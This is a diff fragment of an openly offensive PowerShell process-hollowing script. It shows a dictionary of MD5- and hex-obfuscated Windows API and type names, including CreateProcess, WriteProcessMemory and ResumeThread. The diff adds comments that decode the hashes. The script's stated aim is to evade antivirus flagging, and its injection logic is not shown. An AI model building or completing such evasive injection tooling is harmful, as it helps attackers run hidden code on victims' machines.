@@ -2,21 +2,21 @@
     Simple process hollowing powershell script that is making use of reflection, custom delegates and added obfuscation for potentially flagged strings. Obfuscation is trough simple MD5 hashes and Hex encoding for api names, methods and types
 #>
 $names_dict = @{
-    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"
+    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"      ## System.dll
     "libs" = @{
         "k32" = "6b,65,72,6e,65,6c,33,32,2e,64,6c,6c"
         "nt" = "6e,74,64,6c,6c,2e,64,6c,6c"
     }
     "types" = @{
-        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"
-        "native" = "9c1998077be57de794acb2cc817ea2c6"
-        "start_inf" = "7954136bca5e20bcb3924bae9cd769c2"
-        "proc_inf" = "b8204d05f2f6302a23f8d870b2470d25"
+        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"    ## Microsoft.Win32.UnsafeNativeMethods
+        "native" = "9c1998077be57de794acb2cc817ea2c6"    ## Microsoft.Win32.NativeMethods
+        "start_inf" = "7954136bca5e20bcb3924bae9cd769c2" ## Microsoft.Win32.NativeMethods+STARTUPINFO
+        "proc_inf" = "b8204d05f2f6302a23f8d870b2470d25"  ## Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION
     }
     "apis" = @{
-        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"
-        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"
-        "cproc" = "c6b59bdabc4d10b6cd98e97dbd071549"
+        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"  ## GetModuleHandle
+        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"  ## GetProcAddress
+        "cproc" = "c6b59bdabc4d10b6cd98e97dbd071549"     ## CreateProcess
         "wpm" = "57,72,69,74,65,50,72,6f,63,65,73,73,4d,65,6d,6f,72,79"
         "rpm" = "52,65,61,64,50,72,6f,63,65,73,73,4d,65,6d,6f,72,79"
         "resume" = "52,65,73,75,6d,65,54,68,72,65,61,64"
